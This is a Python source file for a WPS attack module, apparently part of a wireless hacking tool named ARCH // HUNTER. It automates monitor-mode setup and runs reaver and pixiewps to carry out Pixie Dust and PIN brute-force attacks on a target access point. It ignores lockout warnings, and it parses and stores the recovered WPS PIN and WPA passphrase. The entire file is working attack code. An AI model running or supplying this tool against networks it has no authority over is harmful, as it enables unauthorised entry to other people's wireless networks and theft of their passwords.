"""
WPS Attack Module for ARCH // HUNTER
Uses reaver for WPS PIN recovery (Pixie Dust + PIN Bruteforce).
Linux (Kali) only - requires reaver, pixiewps, monitor mode support.
"""
import subprocess
import threading
import time
import os
import re
import shutil
from datetime import datetime
from backend.platform_wifi import IS_LINUX, find_tool


class WPSManager:
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.running = False
        self.starting = False
        self.attack_type = None  # "pixie_dust" or "pin_bruteforce"
        self.target_bssid = None
        self.target_ssid = None
        self.target_channel = None
        self.process = None
        self.results = []
        self._output_lines = []
        self._reader_thread = None
        self._start_time = None
        self._log_callback = None

    def start(self, bssid, ssid, channel, attack_type="pixie_dust", callback=None):
        """Start WPS attack against a target AP."""
        if not IS_LINUX:
            return {"status": "error", "message": "WPS attack only works on Linux (Kali)"}

        if self.running or self.starting:
            return {"status": "error", "message": "WPS attack already running"}

        # Check tools
        reaver_bin = find_tool("reaver")
        if not reaver_bin or not os.path.exists(reaver_bin):
            return {"status": "error", "message": "reaver not found. Install with: apt install reaver"}

        if attack_type == "pixie_dust":
            pixiewps_bin = find_tool("pixiewps")
            if not pixiewps_bin or not os.path.exists(pixiewps_bin):
                return {"status": "error", "message": "pixiewps not found. Install with: apt install pixiewps"}

        self.starting = True
        self.target_bssid = bssid
        self.target_ssid = ssid
        self.target_channel = channel
        self.attack_type = attack_type
        self._output_lines = []
        self._log_callback = callback

        # Run in background thread
        thread = threading.Thread(
            target=self._run_attack,
            args=(bssid, ssid, channel, attack_type, callback),
            daemon=True
        )
        thread.start()

        return {"status": "success", "message": f"WPS {attack_type} attack starting..."}

    def _run_attack(self, bssid, ssid, channel, attack_type, callback):
        """Background thread: setup monitor mode and run reaver."""
        try:
            if callback:
                callback(f"Preparing interface {self.interface} for WPS attack...")

            # Kill interfering processes
            subprocess.run(
                ["airmon-ng", "check", "kill"],
                capture_output=True, timeout=10
            )
            time.sleep(1)

            # Set monitor mode
            if callback:
                callback("Setting monitor mode...")

            subprocess.run(
                ["ip", "link", "set", self.interface, "down"],
                capture_output=True, timeout=5
            )
            subprocess.run(
                ["iw", "dev", self.interface, "set", "type", "monitor"],
                capture_output=True, timeout=5
            )
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                capture_output=True, timeout=5
            )
            time.sleep(1)

            # Set channel
            if callback:
                callback(f"Setting channel {channel}...")
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                capture_output=True, timeout=5
            )

            self.starting = False
            self.running = True
            self._start_time = time.time()

            # Build reaver command
            reaver_bin = find_tool("reaver")
            if attack_type == "pixie_dust":
                cmd = [
                    reaver_bin, "-i", self.interface,
                    "-b", bssid, "-c", str(channel),
                    "-K", "1",  # Pixie Dust mode
                    "-vv",      # Extra verbose
                    "-N",       # No NACK (faster)
                    "-L"        # Ignore lock warnings
                ]
            else:
                # PIN Bruteforce
                cmd = [
                    reaver_bin, "-i", self.interface,
                    "-b", bssid, "-c", str(channel),
                    "-vv",       # Extra verbose
                    "-N",        # No NACK
                    "-d", "1",   # 1 second delay between PINs
                    "-r", "3:15" # After 3 attempts, sleep 15 seconds
                ]

            if callback:
                callback(f"CMD: {' '.join(cmd)}")

            # Start reaver process
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            found_pin = None
            found_psk = None

            for line in iter(self.process.stdout.readline, ''):
                if not self.running:
                    break
                if not line:
                    break

                clean = line.strip()
                if not clean:
                    continue

                self._output_lines.append(clean)
                if callback:
                    callback(clean)

                # Parse WPS PIN
                if "WPS PIN:" in clean:
                    match = re.search(r"WPS PIN:\s*['\"]?(\d+)['\"]?", clean)
                    if match:
                        found_pin = match.group(1)
                    else:
                        found_pin = clean.split(":")[-1].strip().strip("'\"")

                # Parse WPA PSK (password)
                if "WPA PSK:" in clean:
                    match = re.search(r"WPA PSK:\s*['\"](.+?)['\"]", clean)
                    if match:
                        found_psk = match.group(1)
                    else:
                        found_psk = clean.split(":")[-1].strip().strip("'\"")

            # Wait for process to finish
            if self.process:
                self.process.wait()
                self.process = None

            # Record result
            if found_pin or found_psk:
                result = {
                    "bssid": bssid,
                    "ssid": ssid,
                    "pin": found_pin or "N/A",
                    "psk": found_psk or "N/A",
                    "attack_type": attack_type,
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                self.results.append(result)
                if callback:
                    callback(f"SUCCESS: WPS PIN = {found_pin}, WPA PSK = {found_psk}")
            else:
                if callback:
                    callback("FAILED: Could not recover WPS PIN/PSK")

        except Exception as e:
            if callback:
                callback(f"ERROR: {e}")
            print(f"[WPS] Attack error: {e}")
        finally:
            self.running = False
            self.starting = False
            self.process = None
            self._restore_interface()

    def stop(self):
        """Stop the running WPS attack."""
        if not self.running and not self.starting:
            return {"status": "error", "message": "No WPS attack running"}

        self.running = False
        self.starting = False

        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=3)
            except Exception:
                try:
                    self.process.kill()
                except Exception:
                    pass
            self.process = None

        # Kill any remaining reaver processes
        try:
            subprocess.run(
                ["pkill", "-f", "reaver"],
                capture_output=True, timeout=5
            )
        except Exception:
            pass

        self._restore_interface()

        return {"status": "success", "message": "WPS attack stopped"}

    def _restore_interface(self):
        """Restore interface to managed mode and restart NetworkManager."""
        print("[WPS] Restoring interface to managed mode...")
        try:
            subprocess.run(
                ["ip", "addr", "flush", "dev", self.interface],
                capture_output=True, timeout=5
            )
            subprocess.run(
                ["ip", "link", "set", self.interface, "down"],
                capture_output=True, timeout=5
            )
            subprocess.run(
                ["iw", "dev", self.interface, "set", "type", "managed"],
                capture_output=True, timeout=5
            )
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                capture_output=True, timeout=5
            )
        except Exception:
            pass

        subprocess.run(
            ["systemctl", "restart", "wpa_supplicant"],
            capture_output=True, timeout=10
        )
        subprocess.run(
            ["systemctl", "restart", "NetworkManager"],
            capture_output=True, timeout=10
        )
        time.sleep(3)

        # Wait until nmcli can see wifi devices
        for _ in range(5):
            r = subprocess.run(
                ["nmcli", "dev", "wifi", "rescan"],
                capture_output=True, timeout=10
            )
            if r.returncode == 0:
                time.sleep(3)
                break
            time.sleep(2)
        print("[WPS] Interface restored to managed mode")

    def get_status(self):
        """Get current WPS attack status."""
        elapsed = 0
        if self._start_time and self.running:
            elapsed = int(time.time() - self._start_time)

        return {
            "running": self.running,
            "starting": self.starting,
            "attack_type": self.attack_type,
            "target_bssid": self.target_bssid,
            "target_ssid": self.target_ssid,
            "target_channel": self.target_channel,
            "elapsed_seconds": elapsed,
            "result_count": len(self.results),
            "output_lines": self._output_lines[-5:] if self._output_lines else []
        }

    def get_results(self):
        """Get all recovered WPS PINs/passwords."""
        return self.results
